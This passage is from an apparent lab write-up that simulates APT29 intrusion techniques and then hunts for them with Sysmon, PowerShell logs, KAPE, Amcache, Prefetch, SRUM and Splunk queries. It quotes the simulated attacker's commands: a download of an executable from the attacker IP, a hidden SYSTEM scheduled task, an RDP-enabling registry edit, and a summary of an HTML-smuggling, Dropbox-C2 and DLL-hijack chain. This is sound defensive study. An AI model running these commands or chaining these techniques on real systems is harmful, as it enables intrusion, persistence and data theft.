OneDrive.exe > powershell.exe (Old C2 Beacon for Testing)

4344.exe > powershell.exe (4344 beacon)

## T1071.001.exe > powershell.exe (T1071.001 beacon)

HEALTHY_STITCH.exe > powershell.exe (Old C2 Beacon for Testing)

### Commands

![](/assets/img/posts/apt29-hunting/img-147.png)

![](/assets/img/posts/apt29-hunting/img-148.png)

Invoke-WebRequest 'http://192.168.253.148:8080/FUTURE_GARAGE.exe' - OutFile FUTURE.exe whoami hostname ipconfig powershell.exe -args Get-Process (ps beacon command)

whoami /groups iwr http://192.168.253.148/test.txt -OutFile C:\Users\Public\test.txt

"C:\Windows\system32\runas.exe" /user:Administrator cmd

```
schtasks.exe" /create /tn SystemUpdate /tr "powershell.exe -NoProfile -
WindowStyle Hidden -ExecutionPolicy Bypass -File
C:\Users\Public\upd.ps1" /sc hourly /ru SYSTEM
```

HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

"powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass - File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1

Other encoded commands discussed above if we use schtasks.exe we will find the same:

![](/assets/img/posts/apt29-hunting/img-149.png)

I will not waste time here tbh lets go the next

Second lets move to Event ID 3: (Network Connection)

![](/assets/img/posts/apt29-hunting/img-150.png)

First thing we must check is the connection details between Attacker and Victim:

User

User SID

Source IP

Source Host Name

RuleName

Destination IP

Initiating Process

CommandLine

![](/assets/img/posts/apt29-hunting/img-151.png)

![](/assets/img/posts/apt29-hunting/img-152.png)

Lets Answer Each Question:

User: DESKTOP-M8AP5P7\Victim-Machine

User SID: S-1-5-21-1064308082-3896131167-3449499780-1001

Source Host Name: DESKTOP-M8AP5P7

RuleName: User Mode

Destination IP: 192.168.253.148 (Kali IP)

Initiating Process:

rundll32.exe

## T1071.001.exe

OneDrive.exe

4344.exe

Now lets move to Event ID 11: (File Creation)

Here we will find the file written in the drive and how it created:

APT-shtask.ps1 => Created by rundll32.exe

![](/assets/img/posts/apt29-hunting/img-153.png)

![](/assets/img/posts/apt29-hunting/img-154.png)

While i was simulating i transferred the file using ez way to save the time which also will be found

![](/assets/img/posts/apt29-hunting/img-155.png)

![](/assets/img/posts/apt29-hunting/img-156.png)

![](/assets/img/posts/apt29-hunting/img-157.png)

Now we will move to powershell logging detection:

![](/assets/img/posts/apt29-hunting/img-158.png)

First thing we can see here is enable script logging:

ScriptBlockText: Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging - Name EnableScriptBlockLogging -Value 1 -Force

ScriptBlockText: New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" - Force | Out-Null

![](/assets/img/posts/apt29-hunting/img-159.png)

![](/assets/img/posts/apt29-hunting/img-160.png)

Schedule task creations:

![](/assets/img/posts/apt29-hunting/img-161.png)

Web requests we done b4

![](/assets/img/posts/apt29-hunting/img-162.png)

Kape Analysis:

We will use 2 modules for analysis

MiniTimelineCollection

!SANS_Triage

![](/assets/img/posts/apt29-hunting/img-163.png)

![](/assets/img/posts/apt29-hunting/img-164.png)

Full KAPE Command will be:

.\kape.exe --tsource C: --tdest "C:\Users\Victim-Machine\Desktop\Kape Results" - -tflush --target !SANS_Triage,MiniTimelineCollection --gui

Lets start with $MFT File:

![](/assets/img/posts/apt29-hunting/img-165.png)

Will use MFTECmd.exe to parse the events on file into CSV visible file

I transferred it to Forensics Machine to use the tool there

Command used:

C:\Users\Subzero\Desktop\EricZimmer Tools\EricZimmer Tools>MFTECmd.exe -f "C:\Users\Subzero\Desktop$MFT" --csv "C:\Users\Subzero\Desktop"

![](/assets/img/posts/apt29-hunting/img-166.png)

Lets open it on Timeline Exploler

![](/assets/img/posts/apt29-hunting/img-167.png)

![](/assets/img/posts/apt29-hunting/img-168.png)

After multiple searches i found the first beacon "433.exe" details:

![](/assets/img/posts/apt29-hunting/img-169.png)

![](/assets/img/posts/apt29-hunting/img-170.png)

Lets see what data we have:

File Name:

4344.exe

4344.EXE-4A79C548.pf

File have pf files (will use in prefetch file analysis)

Creation Date: 2025-12-03 12:53:00

Modification Date: 2025-12-03 12:53:00 (once installed no further edits on it)

Last Access Date: 2025-12-03 12:54:39

Source File: C:\Users\Subzero\Desktop$MFT

.ps1 file act as schedule task:

![](/assets/img/posts/apt29-hunting/img-171.png)

![](/assets/img/posts/apt29-hunting/img-172.png)

![](/assets/img/posts/apt29-hunting/img-173.png)

File Name: APT-shtask.ps1

Creation Date: 2025-12-02 18:03:35

Modification Date: 2025-12-02 18:03:35 (once installed no further edits on it)

Last Access Date: 2025-12-02 18:09:35

Source File: C:\Users\Subzero\Desktop$MFT

Systemupdate task:

![](/assets/img/posts/apt29-hunting/img-174.png)

File Name: SystemUpdate

File Path:.\Windows\System32\Tasks

File Creation Date: 2025-12-03 15:03:21

Last Modification Date: 2025-12-03 15:03:21

Last Access: 2025-12-05 17:35:54

Source File: C:\Users\Subzero\Desktop$MFT

OneDrive.exe

![](/assets/img/posts/apt29-hunting/img-175.png)

File Name: OneDrive.exe

File Path:.\Users\Victim-Machine\Desktop

File Size: 19456B

Creation Date: 2025-12-02 14:50:42

Last Modifications: 2025-12-02 14:50:42 pf files:

ONEDRIVE.EXE-9BD2FBB9.pf

Now we saw the file, we want to see if its executed or not

Here we have 3 options:

Amcache

Shimcache

Prefetch

Amcache:

KAPE helped us as its already extracted it

Path: C > Windows > AppCompat > Programs > Amcache.hve

![](/assets/img/posts/apt29-hunting/img-176.png)

we will use Amcache Parser Tool to extract the data we want in CSV file

Transferred into forensics machine

NOTE "While transferring the amcache from KAPE, you should analyze the file with LOG file"

Amcache.hve.LOG1

Amcache.hve.LOG2

![](/assets/img/posts/apt29-hunting/img-177.png)

CommandLine used:

AmcacheParser.exe -f "C:\Users\Subzero\Desktop\Programs\Amcache.hve" --csv "C:\Users\Subzero\Desktop"

![](/assets/img/posts/apt29-hunting/img-178.png)

![](/assets/img/posts/apt29-hunting/img-179.png)

Now we got 6 files

Amcache1

Amcache2

Amcache3

Amcache4

Amcache5

Amcache6 lets analyze each one separately

Amcache1:

![](/assets/img/posts/apt29-hunting/img-180.png)

![](/assets/img/posts/apt29-hunting/img-181.png)

Here there is no artifacts observed, its normal files on the device

Its not about executed programs; it is the “Device Containers” view from the Amcache hive, describing hardware and virtual devices configured/seen on the system (NIC, audio, monitor, USB hub, printers, etc.), with status and metadata

Amcache2:

![](/assets/img/posts/apt29-hunting/img-182.png)

![](/assets/img/posts/apt29-hunting/img-183.png)

![](/assets/img/posts/apt29-hunting/img-184.png)

Also no execution artifacts

It is the “Device Classes” or “Device Stack” view from the Amcache hive. It contains detailed metadata about every device, driver, and service stack present on the system, including hardware, virtual devices, and software components

Logs every device class, driver, and service stack that Windows knows about for each hardware/software component, including installation dates, driver versions, and driver stack relationships.

Amcache3:

![](/assets/img/posts/apt29-hunting/img-185.png)

![](/assets/img/posts/apt29-hunting/img-186.png)

![](/assets/img/posts/apt29-hunting/img-187.png)

![](/assets/img/posts/apt29-hunting/img-188.png)

Again no any executions

Drivers” view from the Amcache hive. It contains detailed information about every driver installed on the system, including their file paths, installation timestamps, version numbers, and metadata such as company, driver type, and service associations

Amcache4:

![](/assets/img/posts/apt29-hunting/img-189.png)

![](/assets/img/posts/apt29-hunting/img-190.png)

It contains information about the INF files used to install drivers on the system, including the package name, installation date, associated hardware IDs, and the drivers included in each package.

Amcache5:

![](/assets/img/posts/apt29-hunting/img-191.png)

![](/assets/img/posts/apt29-hunting/img-192.png)

Here is the “Lnk Files” view from the Amcache hive. It contains information about shortcut (.lnk) files that Windows knows about, including the shortcut name, the target path, and the last write timestamp

Logs every shortcut file that Windows has encountered, including those in the Start Menu, user directories, and pinned items.

Each row represents a shortcut file, with the following columns:

KeyName

LnkName

KeyLastWriteTimestamp

Btw u can check path called "c:\users\victim- machine\AppData\Roaming\Microsoft\Windows\Start Menu" this might be a place where attacker try to stay on the system

Amcache6:

![](/assets/img/posts/apt29-hunting/img-193.png)

![](/assets/img/posts/apt29-hunting/img-194.png)

![](/assets/img/posts/apt29-hunting/img-195.png)

Here is FINALYYY!! the “Programs” or “Executables” view from the Amcache hive. It contains detailed information about every executable (EXE, DLL, etc.) that Windows has encountered, including file paths, hashes, timestamps, version information

Lets now dig deep and extract the following from beacons:

beacon name beacon path beacon hash last time file accessed by user

File Name: 4344.exe

File Hash: d0fb209cc582e42ff0ff3bfbc40f88ede8469db5

File Path: c:\users\victim-machine\desktop\4344.exe

Last Time Accessed: 2025-12-03 12:54:11

File Size: 19456B

File Name: evil.exe

File Hash: 206650c4dee86d38d06e1840d13df6555ffaf69a

File Path: c:\users\victim-machine\appdata\local\temp\rade33f6.tmp\evil.exe ( this file dropped in %TMP% folder as u can see in initial malware staging )

Last Time Accessed: 2025-12-02 05:59:30

File Size: 14848B

File Name: t1071.001.exe

File Hash: c250e1c70123cb4a78a41d99c29957119d07a917

File Path: c:\users\victim-machine\desktop\t1071.001.exe

Last Time Accessed: 2025-12-04 09:07:40

File Size: 19434B

File Name: onedrive.exe

File Path: c:\users\victim-machine\desktop\onedrive.exe

File Hash: 559f7bc823af4ef757092e1c2bd439a3f5fc2e60

Last Time Accessed: 2025-12-03 12:18:05

File Size: 19456B

File Name: healthy_stitch.exe

File Path: c:\users\victim-machine\desktop\healthy_stitch.exe

File Hash: 559f7bc823af4ef757092e1c2bd439a3f5fc2e60

Last Time Accessed: 2025-12-01 10:01:18

File Size: 14848B

Now we will go to use shimcache to double check on the evidences:

shimcache will be found in SYSTEM Hive

Kape will drop it in "C:\Users\Victim-Machine\Desktop\Kape Results\C\Windows\system32\config\SYSTEM"

We will use AppCompatCache Parser tool to extract the shimcache from this file ( WE need LOG1 and LOG2 files with the SYSTEM hive )

![](/assets/img/posts/apt29-hunting/img-196.png)

It contains a list of executables that Windows has attempted to run, along with their last modified timestamps, whether they were executed, and the source registry hive from which the entry was extracted

![](/assets/img/posts/apt29-hunting/img-197.png)

![](/assets/img/posts/apt29-hunting/img-198.png)

![](/assets/img/posts/apt29-hunting/img-199.png)

Also can be checked by Registry Forensics: SYSTEM => ControlSet001 => Control => Session Manager =>AppCompatCache

![](/assets/img/posts/apt29-hunting/img-200.png)

Lets now go to check Prefetch Files:

Prefetch file is the confirmation 100% of execution, other artifacts might be modified

KAPE extracted the PF file in " C:\Users\Victim-Machine\Desktop\Kape

Results\C\Windows\prefetch "

![](/assets/img/posts/apt29-hunting/img-201.png)

![](/assets/img/posts/apt29-hunting/img-202.png)

![](/assets/img/posts/apt29-hunting/img-203.png)

Now we will use PECmd.exe to extract data to CSV file

![](/assets/img/posts/apt29-hunting/img-204.png)

Lets start the analysis:

CommandLine:

PECmd.exe -d "C:\Users\Subzero\Desktop\prefetch" --csv

"C:\Users\Subzero\Desktop"

![](/assets/img/posts/apt29-hunting/img-205.png)

![](/assets/img/posts/apt29-hunting/img-206.png)

Now we have the following:

Source File Name

Source Created

Source Modification

Executable Name

Size

Last Run

![](/assets/img/posts/apt29-hunting/img-207.png)

![](/assets/img/posts/apt29-hunting/img-208.png)

![](/assets/img/posts/apt29-hunting/img-209.png)

Now we can confirm 100% of malicious executions

I will no repeat my self again u can check the data above i will just drop the.pf files:

C:\Users\Subzero\Desktop\prefetch\4344.EXE-4A79C548.pf (Run Count: 3)

C:\Users\Subzero\Desktop\prefetch\ARTIFACT_X64.EXE-A673DF30.pf (Run Count: 6)

C:\Users\Subzero\Desktop\prefetch\T1071.001.EXE-0C2CD751.pf (Run Count: )

C:\Users\Subzero\Desktop\prefetch\DLLHOST.EXE-504C779A.pf (Run Count: 7)

C:\Users\Subzero\Desktop\prefetch\POWERSHELL.EXE-920BBA2A.pf (Run Count: 29)

C:\Users\Subzero\Desktop\prefetch\EVIL.EXE-07B0B829.pf (Run Count: 6)

C:\Users\Subzero\Desktop\prefetch\WHOAMI.EXE-B8288E39.pf (Run Count: 8)

C:\Users\Subzero\Desktop\prefetch\HOSTNAME.EXE-D4E60423.pf (Run Count: 1)

Source Time (Execution Time) Between:

2025-12-02 14:50:08

2025-12-06 14:56:15

SRUM Collection:

We need to track application and system resource usage like network activity, energy consumption, and process execution

KAPE drops SRUM here "C:\Users\Victim-Machine\Desktop\Kape Results\C\Windows\system32\SRU"

Will use SrumECmd.exe to extract the data into csv file

CommandLine:

SrumECmd.exe -f "C:\Users\Subzero\Desktop\SRUDB.dat" --csv C:\Users\Subzero\Desktop\

SrumECmd.exe -d "C:\Users\Subzero\Desktop\SRU" --csv C:\Users\Subzero\Desktop\

![](/assets/img/posts/apt29-hunting/img-210.png)

![](/assets/img/posts/apt29-hunting/img-211.png)

Now we extracted files known for the following:

ApplicationResourceUsage.csv

NetworkConnectivity.csv

EnergyUsage.csv

NetworkUsage.csv

Timeline.csv

Process Resource Usage

Lets Start

Srum1-SrumECmd_AppResourceUseInfo_Output

![](/assets/img/posts/apt29-hunting/img-212.png)

![](/assets/img/posts/apt29-hunting/img-213.png)

Here will see each app how it uses the resources on the device

File Name: T1071.001.exe

Face Time: 109206880000

Foreground Bytes: 2344960

File Name: evil.exe

Face Time: 36600150000

Foreground Bytes: 1638400

Srum2-SrumECmd_AppTimelineProvider_Output

![](/assets/img/posts/apt29-hunting/img-214.png)

Here we will find the evidence for file and commandline like:

net1 (creating the user)

whoami hostname

```
schtasks.exe (by user => S-1-5-21-1064308082-3896131167-
3449499780-1001)
```

![](/assets/img/posts/apt29-hunting/img-215.png)

any powershell execution done by compromised user (S-1-5-21- 1064308082-3896131167-3449499780-1001)

![](/assets/img/posts/apt29-hunting/img-216.png)

Also i can identify when the file executed and last time execution and track the period from it

Srum5-NetworkUsages_Output:

Process that did a real network connection

![](/assets/img/posts/apt29-hunting/img-217.png)

![](/assets/img/posts/apt29-hunting/img-218.png)

![](/assets/img/posts/apt29-hunting/img-219.png)

Processes:

t1071.001.exe:

Bytes Sent: 83338496

Bytes Received: 65592861 evil.exe:

Bytes Sent: 42709

Bytes Received: 150474 invite for attack.hta.exe:

Bytes Sent: 48564

Bytes Received: 224350

OneDrive.exe

Bytes Sent: 28245

Bytes Received: 201581 rundll32.exe ( that one which has unusual amount of data )

Bytes Sent: 194044

Bytes Received: 44699

Interface Type:

IF_TYPE_ETHERNET_CSMACD

Interface Luid:

1689399632855040

Full simulation by ps script:

https://github.com/carbonblack/tau-tools/blob/master/threat_emulation/Invoke- APT29/apt29.ps1

Analysis for Attachment drop technique; https://github.com/S3N4T0R-0X0/APT29-Adversary-Simulation

Quick Summary:

1. DOCX File (Initial Access)

The attack begins with a malicious DOCX document containing an embedded hyperlink. When clicked, the hyperlink silently downloads an external HTML file that serves as the next stage of the attack via HTML smuggling.

The key advantage of using a hyperlink is that it does not appear directly in the document text, helping the attackers evade user suspicion.

2. HTML Smuggling

The downloaded HTML file employs HTML smuggling techniques to conceal an ISO file.

The ISO payload is Base64-encoded (e.g., base64 payload.iso -w 0 ) and embedded directly within the HTML file. When rendered, the browser reconstructs and downloads the ISO locally, bypassing traditional network-based detection.

To increase credibility, the HTML page includes phishing text and a BMW car image, aligning with the social engineering theme of the campaign.

3. ISO File and LNK Abuse

The reconstructed ISO file contains multiple LNK (shortcut) files masquerading as image files.

When executed, these LNK files:

Launch a legitimate executable

Display a decoy PNG image to the victim

Secretly load encrypted shellcode into memory, which is then decrypted at runtime

This technique ensures user deception while executing the malicious payload in the background.

4. Image-Based Execution (Second Stage – Implantation)

A specially crafted PNG image is used as a delivery mechanism. While the image displays legitimate BMW visuals, opening it triggers malicious activity in the background.

Using WinRAR SFX (self-extracting archive):

A command-line payload is configured to execute automatically upon extraction

The archive icon is replaced with an image icon to maintain visual deception

A shortcut to this archive is then embedded alongside legitimate images and packaged into an ISO file using PowerISO.

- **Note:** This ISO file is later Base64-encoded and embedded into the HTML smuggling file, which is linked inside the DOCX document.

5. Payload Execution (Third Stage)

Because the command execution is configured under “Run after extraction” in WinRAR’s Advanced SFX options, the payload is executed automatically when the victim opens the ISO file.

From the victim’s perspective:

They believe they are opening high-quality BMW images

In reality, the malicious payload executes simultaneously with the image display

6. Dropbox C2 Channel (Fourth Stage – Data Exfiltration)

The attackers leverage the Dropbox API as a Command and Control (C2) channel.

By using Dropbox

Malicious traffic blends into legitimate cloud service traffic

Detection becomes significantly more difficult for security teams

The attackers

Create a Dropbox account and enable API permissions

Generate an access token

Encrypt the token using AES (ECB mode) with a user-supplied key (16/24/32 bytes)

Base64-encode the encrypted token for use in the payload

A Python-based test payload was initially used to validate Dropbox connectivity before deploying the full malware. 7. DLL Hijacking and Shellcode Injection (Fifth Stage)

The final payload uses DLL hijacking to execute malicious code within a legitimate process.

Execution Flow

DLL Hijacking

A malicious DLL is loaded instead of a legitimate one due to improper DLL search order handling.

Shellcode Execution

The shellcode is stored inside the malicious DLL and executed via the DllMain function.

Memory Allocation

The payload uses VirtualAlloc to allocate executable memory within the target process.

Shellcode Injection

The shellcode is copied into the allocated memory using memcpy.

Privilege Inheritance

If the target process runs with elevated privileges, the injected shellcode inherits those privileges, enabling higher-impact actions.

If the malicious DLL fails to load, the payload logs a warning and continues execution without terminating. 8. Final Payload Execution

After successful decryption and in-memory loading, the final payload:

Establishes outbound communication with the *Dropbox API-based C2

Optionally connects to primary and secondary C2 servers using Microsoft Graph API

Uploads collected data and command execution output to Dropbox

![](/assets/img/posts/apt29-hunting/img-220.png)

![](/assets/img/posts/apt29-hunting/img-221.png)

![](/assets/img/posts/apt29-hunting/img-222.png)

![](/assets/img/posts/apt29-hunting/img-223.png)

![](/assets/img/posts/apt29-hunting/img-224.png)

![](/assets/img/posts/apt29-hunting/img-225.png)

SPL Queries:

index=windows EventCode=4688 (NewProcessName="powershell.exe" OR Process_Command_Line="powershell*") | where like(Process_Command_Line,"%EncodedCommand%") OR like(Process_Command_Line,"%IEX%") | stats count by ComputerName, NewProcessName, Process_Command_Line, ParentProcessName index=windows (EventCode=4688 OR EventCode=10) (ProcessName="lsass.exe" OR TargetImage="lsass.exe") | stats count by ComputerName, ProcessName, SourceImage, TargetImage index=windows EventCode=4688 | where like(NewProcessName,"%AppData%") OR like(NewProcessName,"%Temp%") | stats count by NewProcessName, ParentProcessName, ComputerName index=windows EventCode=4698 | stats count by TaskName, Author, Command, ComputerName index=windows EventCode=4657 Registry_Path="\Run\" OR Registry_Path="\RunOnce\" | stats count by Registry_Path, New_Value, ComputerName index=windows EventCode=4688 ParentProcessName="wmiprvse.exe" | stats count by ComputerName, NewProcessName, Process_Command_Line index=windows EventCode=4688 NewProcessName="rundll32.exe" | where like(Process_Command_Line,"%AppData%") OR like(Process_Command_Line,"%Temp%") | stats count by ComputerName, Process_Command_Line index=proxy OR index=network (dest_port=443 OR dest_port=8443) | stats count by src_ip, dest_ip, dest_domain | where count < 5 index=windows EventCode=4624 LogonType=3 | stats count by Account_Name, ComputerName, Source_Network_Address index=windows EventCode=4663 Object_Name="\AppData\" OR Object_Name="\Temp\" | stats count by Object_Name, ProcessName, ComputerName
